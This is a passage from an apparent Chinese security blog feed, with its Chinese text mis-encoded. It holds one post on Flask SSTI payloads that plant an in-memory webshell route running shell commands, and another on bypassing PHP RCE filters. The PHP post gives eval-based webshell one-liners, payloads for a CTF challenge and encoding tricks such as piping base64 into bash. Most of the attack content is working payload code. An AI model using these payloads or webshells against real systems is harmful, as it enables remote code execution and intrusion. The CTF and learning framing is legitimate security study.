è·¯ç”±ï¼Œè·Ÿè¿›å»åœ¨çœ‹çœ‹</p><img src="/blog/2025/02/03/Python/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250203183231034.png" class title="image-20250203183231034"><ul><li>ruleï¼šå‡½æ•°å¯¹åº”çš„URLè§„åˆ™ï¼Œæ»¡è¶³æ¡ä»¶å’Œ app.route() çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸€æ ·ï¼Œå¿…é¡»ä»¥<code>/</code>å¼€å¤´ï¼›</li><li>endpointï¼šç«¯ç‚¹ï¼Œå³åœ¨ä½¿ç”¨ url_for() è¿›è¡Œåè½¬çš„æ—¶å€™ï¼Œè¿™é‡Œä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ endpoint å¯¹åº”çš„å€¼ã€‚è¿™ä¸ªå€¼ä¹Ÿå¯ä»¥ä¸æŒ‡å®šï¼Œé‚£ä¹ˆé»˜è®¤å°±ä¼šä½¿ç”¨å‡½æ•°çš„åå­—ä½œä¸º endpoint çš„å€¼ï¼›</li><li>view_funcï¼šURLå¯¹åº”çš„å‡½æ•°ï¼ˆæ³¨æ„ï¼Œè¿™é‡Œåªéœ€å†™å‡½æ•°åå­—è€Œä¸ç”¨åŠ æ‹¬å·ï¼‰</li><li>provide_automatic_optionsï¼šæ§åˆ¶æ˜¯å¦åº”è‡ªåŠ¨æ·»åŠ é€‰é¡¹æ–¹æ³•ã€‚è¿™ä¹Ÿå¯ä»¥é€šè¿‡è®¾ç½®è§†å›¾æ¥æ§åˆ¶_func.provide_automatic_options &#x3D;æ·»åŠ è§„åˆ™å‰ä¸ºFalseï¼›</li><li>optionsï¼šè¦è½¬å‘åˆ°åŸºç¡€è§„åˆ™å¯¹è±¡çš„é€‰é¡¹ã€‚Werkzeug çš„ä¸€ä¸ªå˜åŒ–æ˜¯å¤„ç†æ–¹æ³•é€‰é¡¹ã€‚æ–¹æ³•æ˜¯æ­¤è§„åˆ™åº”é™åˆ¶çš„æ–¹æ³•åˆ—è¡¨ï¼ˆGETã€POSTç­‰ï¼‰ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè§„åˆ™åªä¾¦å¬ GETï¼ˆå¹¶éšå¼åœ°ä¾¦å¬HEADï¼‰</li></ul><p>æ‰€ä»¥payloadçš„add_url_ruleçš„è¿™éƒ¨åˆ†å°±æ˜¯æ·»åŠ ä¸€ä¸ªè·¯ç”±ï¼Œç„¶åå¤„ç†å‡½æ•°æ˜¯ç”¨lambdaå…³é”®å­—å®šä¹‰çš„åŒ¿åå‡½æ•°</p><h4 id="app"><a href="#app" class="headerlink" title="app:"></a>app:</h4><p>evalçš„ç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯ç”¨å­—å…¸çš„å½¢å¼å®šä¹‰ä¸€äº›å…¨å±€å˜é‡ç»™ç¬¬ä¸€ä¸ªå‚æ•°ä¹Ÿå°±æ˜¯æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ç”¨ï¼Œè¿™é‡Œçš„appå°±æ˜¯ç”¨url_forè·å–çš„åº”ç”¨çš„å½“å‰ä¸Šä¸‹æ–‡appï¼Œå±æ€§ä¸º<strong>current_app</strong>ï¼›</p><h4 id="request-ctx-stackï¼š"><a href="#request-ctx-stackï¼š" class="headerlink" title="_request_ctx_stackï¼š"></a><strong>_request_ctx_stack</strong>ï¼š</h4><p><code>_request_ctx_stack</code>æ˜¯Flaskçš„ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œæ˜¯ä¸€ä¸ªLocalStackå®ä¾‹</p><p>ä¸ºä»€ä¹ˆè¦è·å–è¿™ä¸ªå˜é‡å‘¢ï¼Œè¿™å’ŒFlaskçš„è¯·æ±‚ä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶æœ‰å…³ï¼š</p><p>å½“ä¸€ä¸ªè¯·æ±‚è¿›å…¥Flaskï¼Œé¦–å…ˆä¼šå®ä¾‹åŒ–ä¸€ä¸ªRequest Contextï¼Œè¿™ä¸ªä¸Šä¸‹æ–‡å°è£…äº†è¯·æ±‚çš„ä¿¡æ¯åœ¨Requestä¸­ï¼Œå¹¶å°†è¿™ä¸ªä¸Šä¸‹æ–‡æ¨å…¥åˆ°ä¸€ä¸ªåä¸º<code>_request_ctx_stack</code> çš„æ ˆç»“æ„ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´è·å–å½“å‰çš„è¯·æ±‚ä¸Šä¸‹æ–‡ç­‰åŒäºè·å–<code>_request_ctx_stack</code>çš„æ ˆé¡¶å…ƒç´ <code>_request_ctx_stack.top</code> ã€‚</p><p>ç®€å•æ¥è¯´å°±æ˜¯ä¸ºäº†è·å–è®¿é—®çš„cmdå‚æ•°ï¼Œ_request_ctx_stack.top.request.args.get(â€˜cmdâ€™, â€˜whoamiâ€™)</p><h4 id="ç»•è¿‡æ€è·¯"><a href="#ç»•è¿‡æ€è·¯" class="headerlink" title="ç»•è¿‡æ€è·¯"></a>ç»•è¿‡æ€è·¯</h4><p>å…¶æœ¬è´¨ä¹Ÿå°±æ˜¯ä¸ªsstiçš„ç»•è¿‡</p><h5 id="url-forè¢«è¿‡æ»¤ï¼š"><a href="#url-forè¢«è¿‡æ»¤ï¼š" class="headerlink" title="url_forè¢«è¿‡æ»¤ï¼š"></a>url_forè¢«è¿‡æ»¤ï¼š</h5><p>å¯ä»¥ç”¨<code>get_flashed_messages</code>æˆ–<code>request.application.__self__._get_data_for_json</code>ä»£æ›¿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;get_flashed_messages.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>:get_flashed_messages.__globals__[<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>],<span class="hljs-string">&#x27;app&#x27;</span>:get_flashed_messages.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><h5 id="evalè¢«è¿‡æ»¤ï¼š"><a href="#evalè¢«è¿‡æ»¤ï¼š" class="headerlink" title="evalè¢«è¿‡æ»¤ï¼š"></a>evalè¢«è¿‡æ»¤ï¼š</h5><p>ç”¨execä»£æ›¿æˆ–è€…æ˜¯é‡‡ç”¨å­—ç¬¦ä¸²æ‹¼æ¥æ–¹å¼ï¼Œå¦‚<code>[&#39;__builtins__&#39;][&#39;eval&#39;]</code>å˜ä¸º<code>[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;ev&#39;+&#39;al&#39;]</code>ï¼›</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;request.application.__self__._get_data_for_json.__getattribute__(<span class="hljs-string">&#x27;__globa&#x27;</span>+<span class="hljs-string">&#x27;ls__&#x27;</span>).__getitem__(<span class="hljs-string">&#x27;__bui&#x27;</span>+<span class="hljs-string">&#x27;ltins__&#x27;</span>).__getitem__(<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ec&#x27;</span>)(<span class="hljs-string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="hljs-string">&#x27;_request_ct&#x27;</span>+<span class="hljs-string">&#x27;x_stack&#x27;</span>:get_flashed_messages.__getattribute__(<span class="hljs-string">&#x27;__globa&#x27;</span>+<span class="hljs-string">&#x27;ls__&#x27;</span>).pop(<span class="hljs-string">&#x27;_request_&#x27;</span>+<span class="hljs-string">&#x27;ctx_stack&#x27;</span>),<span class="hljs-string">&#x27;app&#x27;</span>:get_flashed_messages.__getattribute__(<span class="hljs-string">&#x27;__globa&#x27;</span>+<span class="hljs-string">&#x27;ls__&#x27;</span>).pop(<span class="hljs-string">&#x27;curre&#x27;</span>+<span class="hljs-string">&#x27;nt_app&#x27;</span>)&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><ul><li><code>__globals__</code>å¯ç”¨<code>__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;)</code>æ›¿æ¢ï¼›</li><li><code>[]</code>ä¸­æ‹¬å·å¯ç”¨<code>.__getitem__()</code>æˆ–<code>.pop()</code>æ›¿æ¢ï¼›</li></ul><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘çš„</p><p><code>request.application.__self__._get_data_for_json.__globals__</code>è¯´æ‰¾ä¸åˆ°<code>__globals__</code>å±æ€§</p><h5 id="appçš„å¦å¤–è·å–"><a href="#appçš„å¦å¤–è·å–" class="headerlink" title="appçš„å¦å¤–è·å–"></a>appçš„å¦å¤–è·å–</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">url_for.__globals__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;__main__&#x27;</span>].__dict__[<span class="hljs-string">&#x27;app&#x27;</span>].add_url_rule(<span class="hljs-string">&#x27;/shell&#x27;</span>,<span class="hljs-string">&#x27;shell&#x27;</span>,<span class="hljs-keyword">lambda</span> :<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;dir&#x27;</span>).read())<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RCEä¸­é‡åˆ°è¿‡æ»¤</title>
    <link href="/blog/2025/01/29/PHP/RCE%E4%B8%AD%E9%81%87%E5%88%B0%E8%BF%87%E6%BB%A4/"/>
    <url>/blog/2025/01/29/PHP/RCE%E4%B8%AD%E9%81%87%E5%88%B0%E8%BF%87%E6%BB%A4/</url>
    
    <content type="html"><![CDATA[<h3 id="è¿‡æ»¤-or"><a href="#è¿‡æ»¤-or" class="headerlink" title="è¿‡æ»¤&lt; or &lt;? or ? or php"></a>è¿‡æ»¤&lt; or &lt;? or ? or php</h3><p>å¯ä»¥ä½¿ç”¨çŸ­æ ‡ç­¾ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;123&#x27;</span>;<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#å‰ææ˜¯å¼€å¯é…ç½®å‚æ•°short_open_tags=on</span><br><span class="hljs-meta">&lt;?=</span>(è¡¨è¾¾å¼)<span class="hljs-meta">?&gt;</span>  ç­‰ä»·äº <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> (è¡¨è¾¾å¼)<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#ä¸éœ€è¦å¼€å¯å‚æ•°è®¾ç½®</span><br>&lt;% <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;123&#x27;</span>;%&gt;   <span class="hljs-comment">#å¼€å¯é…ç½®å‚æ•°asp_tags=onï¼Œå¹¶ä¸”åªèƒ½åœ¨7.0ä»¥ä¸‹ç‰ˆæœ¬ä½¿ç”¨</span><br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;123&#x27;</span>; &lt;/script&gt; <span class="hljs-comment">#ä¸éœ€è¦ä¿®æ”¹å‚æ•°å¼€å…³ï¼Œä½†æ˜¯åªèƒ½åœ¨7.0ä»¥ä¸‹å¯ç”¨ã€‚</span><br><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span>            <span class="hljs-comment">//æ­£å¸¸å†™æ³•</span><br><span class="hljs-meta">&lt;?=</span>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span>               <span class="hljs-comment">//çŸ­æ ‡ç­¾ï¼Œé€‚åˆè¿‡æ»¤php</span><br>    <br>&lt;% @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); %&gt;                <span class="hljs-comment">//aspé£æ ¼</span><br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;  <span class="hljs-comment">//&lt;script&gt;é£æ ¼ï¼Œé€‚åˆè¿‡æ»¤&lt;?</span><br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªctfé¢˜ç›®fsctf[EZ_eval]2023</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;word&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$word</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;word&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|tail|more|head|nl|flag|less| /&quot;</span>, <span class="hljs-variable">$word</span>))&#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono.&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$word</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$word</span>);<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;?&gt;&quot;</span>. <span class="hljs-variable">$word</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿‡æ»¤?ä¸ç©ºæ ¼</p><p>æ³¨æ„ï¼š</p><p>ä¹Ÿèƒ½æ­£å¸¸æ‰§è¡Œï¼Œé‚£å°±è¯´æ˜$wordåªè¦æ˜¯ä¸€ä¸ªæ­£å¸¸çš„phpä»£ç å°±èƒ½æ­£å¸¸æ‰§è¡Œï¼Œè€Œ?&gt;ä¸ä¼šå½±å“åé¢çš„phpä»£ç </p><img src="/blog/2025/01/29/PHP/RCE%E4%B8%AD%E9%81%87%E5%88%B0%E8%BF%87%E6%BB%A4/image-20250119035715816.png" class title="image-20250119035715816"><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script%<span class="hljs-number">09</span>language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;strings%09/fl*&#x27;</span>)&lt;/script&gt;<br><span class="hljs-keyword">or</span><br>&lt;script%<span class="hljs-number">09</span>language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;c\a\t%09/fl*&#x27;</span>)&lt;/script&gt;<br><span class="hljs-keyword">or</span><br>&lt;script%<span class="hljs-number">09</span>language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;paste%09/fl*&#x27;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3 id="è¿‡æ»¤äº†ç©ºæ ¼"><a href="#è¿‡æ»¤äº†ç©ºæ ¼" class="headerlink" title="è¿‡æ»¤äº†ç©ºæ ¼"></a>è¿‡æ»¤äº†ç©ºæ ¼</h3><p>ä»¥ä¸‹æ˜¯å¯ä»¥ä»£æ›¿ç©ºæ ¼ï¼ˆurlç¼–ç æ˜¯%20ï¼‰çš„ï¼š</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mel">%09ï¼štabé”®ï¼ˆæ°´å¹³ï¼‰<br>%0aï¼šæ¢è¡Œ<br>%0cï¼šæ–°çš„ä¸€é¡µ<br>%0dï¼šç›¸å½“äº<span class="hljs-keyword">return</span>ä½œç”¨<br>%0bï¼štabé”®ï¼ˆå‚ç›´ï¼‰<br>$&#123;IFS&#125;   æ³¨æ„ï¼š<span class="hljs-keyword">system</span>()å‡½æ•°é‡Œé¢ç”¨å•å¼•å·ï¼ˆ<span class="hljs-string">&#x27;&#x27;</span>ï¼‰ï¼Œå¦åˆ™$&#123;IFS&#125;æ²¡åŠæ³•è¢«è§£é‡Šä¸ºç©ºæ ¼è€Œç»•è¿‡<br>&#123;IFS&#125;<br>$IFS<br>$IFS$1 <span class="hljs-comment">//$1æ”¹æˆ$åŠ å…¶ä»–æ•°å­—è²Œä¼¼éƒ½è¡Œ</span><br>IFS<br>&lt;<br>&lt;&gt;<br>&#123;cat,flag.php&#125;  <span class="hljs-comment">//ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½ï¼Œéœ€è¦ç”¨&#123;&#125;æ‹¬èµ·æ¥</span><br>X=$&#x27;cat\x09./flag.php<span class="hljs-string">&#x27;;$X   (\x09è¡¨ç¤ºtabï¼Œä¹Ÿå¯ä»¥ç”¨\x20)</span><br></code></pre></td></tr></table></figure><h3 id="ç¦æ­¢cat"><a href="#ç¦æ­¢cat" class="headerlink" title="ç¦æ­¢cat"></a>ç¦æ­¢cat</h3><h4 id="æ–¹æ³•1ä½¿ç”¨è½¬ä¹‰ç¬¦å·ç»•è¿‡ï¼š"><a href="#æ–¹æ³•1ä½¿ç”¨è½¬ä¹‰ç¬¦å·ç»•è¿‡ï¼š" class="headerlink" title="æ–¹æ³•1ä½¿ç”¨è½¬ä¹‰ç¬¦å·ç»•è¿‡ï¼š"></a>æ–¹æ³•1ä½¿ç”¨è½¬ä¹‰ç¬¦å·ç»•è¿‡ï¼š</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">c\<span class="hljs-selector-tag">a</span>\t<br></code></pre></td></tr></table></figure><h4 id="æ–¹æ³•2æ›¿æ¢æ³•ï¼š"><a href="#æ–¹æ³•2æ›¿æ¢æ³•ï¼š" class="headerlink" title="æ–¹æ³•2æ›¿æ¢æ³•ï¼š"></a>æ–¹æ³•2æ›¿æ¢æ³•ï¼š</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹<br>less:ä¸ more ç±»ä¼¼<br><span class="hljs-built_in">head</span>:æŸ¥çœ‹å¤´å‡ è¡Œ<br><span class="hljs-built_in">tac</span>:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º <span class="hljs-built_in">tac</span> æ˜¯ <span class="hljs-built_in">cat</span> çš„åå‘æ˜¾ç¤º<br><span class="hljs-built_in">tail</span>:æŸ¥çœ‹å°¾å‡ è¡Œ<br><span class="hljs-built_in">nl</span>ï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·<br><span class="hljs-built_in">od</span>:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹<br>vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹<br>vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹<br><span class="hljs-built_in">sort</span>:å¯ä»¥æŸ¥çœ‹<br><span class="hljs-built_in">uniq</span>:å¯ä»¥æŸ¥çœ‹<br>file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹<br>sh /flag 2&gt;%261 //æŠ¥é”™å‡ºæ–‡ä»¶å†…å®¹<br></code></pre></td></tr></table></figure><h3 id="è¿‡æ»¤äº†å…³é”®å­—flag"><a href="#è¿‡æ»¤äº†å…³é”®å­—flag" class="headerlink" title="è¿‡æ»¤äº†å…³é”®å­—flag"></a>è¿‡æ»¤äº†å…³é”®å­—flag</h3><h4 id="æ–¹æ³•1ç¼–ç ç»•è¿‡ï¼š"><a href="#æ–¹æ³•1ç¼–ç ç»•è¿‡ï¼š" class="headerlink" title="æ–¹æ³•1ç¼–ç ç»•è¿‡ï¼š"></a>æ–¹æ³•1ç¼–ç ç»•è¿‡ï¼š</h4><p>base64ç¼–ç ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;ZmxhZy5waHA=&#x27;</span> | <span class="hljs-built_in">base64</span> -d`<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWcucGhw&quot;</span> | <span class="hljs-built_in">base64</span> -d | bash  <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> Y2F0IGZsYWcucGhw|<span class="hljs-built_in">base64</span> -d|sh<br></code></pre></td></tr></table></figure><p>ç­‰åŒäºcat flag.php</p><p>hexç¼–ç ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;63617420666c61672e706870&quot;</span> | xxd -r -p | bash  //<span class="hljs-string">&quot;&quot;</span>ä¹Ÿå¯ä»¥å»æ‰  <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;63617420666c61672e706870&quot;</span> | xxd -r -p | sh     <br></code></pre></td></tr></table></figure><h4 id="æ–¹æ³•2å˜é‡èµ‹å€¼æ‹¼æ¥ç»•è¿‡ï¼š"><a href="#æ–¹æ³•2å˜é‡èµ‹å€¼æ‹¼æ¥ç»•è¿‡ï¼š" class="headerlink" title="æ–¹æ³•2å˜é‡èµ‹å€¼æ‹¼æ¥ç»•è¿‡ï¼š"></a>æ–¹æ³•2å˜é‡èµ‹å€¼æ‹¼æ¥ç»•è¿‡ï¼š</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=fl;b=ag;<span class="hljs-built_in">cat</span> $a<span class="hljs-variable">$b</span>.php<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=g;<span class="hljs-built_in">cat</span>$IFS$1fla<span class="hljs-variable">$a</span>.php<br></code></pre></td></tr></table></figure><h4 id="æ–¹æ³•3å†…è”æ‰§è¡Œç»•è¿‡ï¼š"><a href="#æ–¹æ³•3å†…è”æ‰§è¡Œç»•è¿‡ï¼š" class="headerlink" title="æ–¹æ³•3å†…è”æ‰§è¡Œç»•è¿‡ï¼š"></a>æ–¹æ³•3å†…è”æ‰§è¡Œç»•è¿‡ï¼š</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">ls</span>`<br><span class="hljs-built_in">echo</span> `<span class="hljs-built_in">ls</span>`;<br><span class="hljs-built_in">echo</span> $(<span class="hljs-built_in">ls</span>);<br>?&gt;&lt;?=`<span class="hljs-built_in">ls</span>`;<br>?&gt;&lt;?=$(<span class="hljs-built_in">ls</span>);<br></code></pre></td></tr></table></figure><h4 id="æ–¹æ³•4-ç»•è¿‡ï¼š"><a href="#æ–¹æ³•4-ç»•è¿‡ï¼š" class="headerlink" title="æ–¹æ³•4[]ç»•è¿‡ï¼š"></a>æ–¹æ³•4[]ç»•è¿‡ï¼š</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> fl[a]g.php<br></code></pre></td></tr></table></figure><h4 id="æ–¹æ³•5ç©ºå˜é‡ç»•è¿‡ï¼š"><a href="#æ–¹æ³•5ç©ºå˜é‡ç»•è¿‡ï¼š" class="headerlink" title="æ–¹æ³•5ç©ºå˜é‡ç»•è¿‡ï¼š"></a>æ–¹æ³•5ç©ºå˜é‡ç»•è¿‡ï¼š</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> fl<span class="hljs-variable">$&#123;2&#125;</span>ag //ä½¿ç”¨$*å’Œ<span class="hljs-variable">$@</span>ï¼Œ<span class="hljs-variable">$x</span>(x ä»£è¡¨ 1-9),<span class="hljs-variable">$&#123;x&#125;</span>(x&gt;=10)(å°äº 10 ä¹Ÿå½³äº)<br></code></pre></td></tr></table></figure><h4 id="æ–¹æ³•6é€šé…ç¬¦ç»•è¿‡ï¼š"><a href="#æ–¹æ³•6é€šé…ç¬¦ç»•è¿‡ï¼š" class="headerlink" title="æ–¹æ³•6é€šé…ç¬¦ç»•è¿‡ï¼š"></a>æ–¹æ³•6é€šé…ç¬¦ç»•è¿‡ï¼š</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> fl*<br></code></pre></td></tr></table></figure><h4 id="æ–¹æ³•7ä½¿ç”¨è½¬ä¹‰ç¬¦å·ç»•è¿‡ï¼š"><a href="#æ–¹æ³•7ä½¿ç”¨è½¬ä¹‰ç¬¦å·ç»•è¿‡ï¼š" class="headerlink" title="æ–¹æ³•7ä½¿ç”¨è½¬ä¹‰ç¬¦å·ç»•è¿‡ï¼š"></a>æ–¹æ³•7ä½¿ç”¨è½¬ä¹‰ç¬¦å·ç»•è¿‡ï¼š</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> f\l\a\g<br></code></pre></td></tr></table></figure><h4 id="æ–¹æ³•8â€™â€™ç»•è¿‡ï¼š"><a href="#æ–¹æ³•8â€™â€™ç»•è¿‡ï¼š" class="headerlink" title="æ–¹æ³•8â€™â€™ç»•è¿‡ï¼š"></a>æ–¹æ³•8â€™â€™ç»•è¿‡ï¼š</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> fl<span class="hljs-string">&#x27;&#x27;</span>ag<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æ— å‚æ•°RCEç»•è¿‡æ€è·¯</title>
    <link href="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/"/>
    <url>/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/</url>
    
